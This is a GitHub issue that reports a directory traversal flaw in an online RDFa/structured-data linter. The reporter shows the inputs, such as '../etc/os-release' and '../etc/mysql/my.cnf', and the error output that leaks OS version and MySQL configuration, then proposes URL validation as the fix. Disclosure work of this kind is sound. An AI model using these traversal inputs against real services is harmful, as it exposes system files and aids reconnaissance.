## Description

[![@SkypLabs](https://avatars.githubusercontent.com/u/9932586?u=3e8f635e6e5304dc844c15bc0ef626e415ae4b1f&v=4&size=48)](/SkypLabs)[SkypLabs](https://github.com/SkypLabs)opened [on Sep 25, 2017](https://github.com/structured-data/linter/issues/41#issue-260209223)

Hi,

When I used your online tool to check the RDFa attributes of my own website, I got the following error:

```
error IOError: Failed to open blog.skyplabs.net: No such file or directory @ rb_sysopen - blog.skyplabs.net

```

The problem here is that I didn't precise `http://`. Consequently, the software tried to find `blog.skyplabs.net` as a local file. This issue leads to a directory traversal attack, allowing an attacker to disclose information about the remote system.

For example, it is possible to know if a directory exists or not (with `../etc/ssh` as input):

```
error Errno::EISDIR: Is a directory @ io_fread - ../etc/ssh

```

When used on a file which the format is not recognised by the parser, the error message tends to leak some precious information (with `../etc/os-release` as input):

```
validation ../etc/os-release: Errors found during processing

validation ../etc/os-release: ERROR [line 1] Lexer error: With input 'NAME="Ubuntu" VERSION="14.04.5 LTS, Trusty Tahr" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 14.04.5': Invalid token "NAME=\"Ubuntu\"": {:production=>:statement, :token=>"NAME=\"Ubuntu\""}:

validation ../etc/os-release: FATAL recovery: statement: ["."]

```

For example, an attacker could use this vulnerability to reveal the installed and running services on the remote host (with `../etc/mysql/my.cnf` as input):

```
validation ../etc/mysql/my.cnf: Errors found during processing

validation ../etc/mysql/my.cnf: ERROR [line 19] Lexer error: With input 'client] port = 3306 socket = /var/run/mysqld/mysqld.sock # Here is entries for some specific progr': Invalid token "client]": {:production=>:predicateObjectList, :token=>"client]"}:

validation ../etc/mysql/my.cnf: FATAL recovery: predicateObjectList: ";"

validation ../etc/mysql/my.cnf: FATAL recovery: blankNodePropertyList: "]"

validation ../etc/mysql/my.cnf: FATAL recovery: triples: ["."]

validation ../etc/mysql/my.cnf: FATAL recovery: statement: ["."]

```

We know now that the MySQL server is installed on the remote server and listens on port 3306. To check if it is currently running or not (with `../var/run/mysqld/mysqld.sock` as input):

```
error IOError: Failed to open ../var/run/mysqld/mysqld.sock: No such file or directory @ rb_sysopen - ../var/run/mysqld/mysqld.sock

```

To fix this issue, the user inputs need to be checked to ensure that they are real URL addresses and not local files.
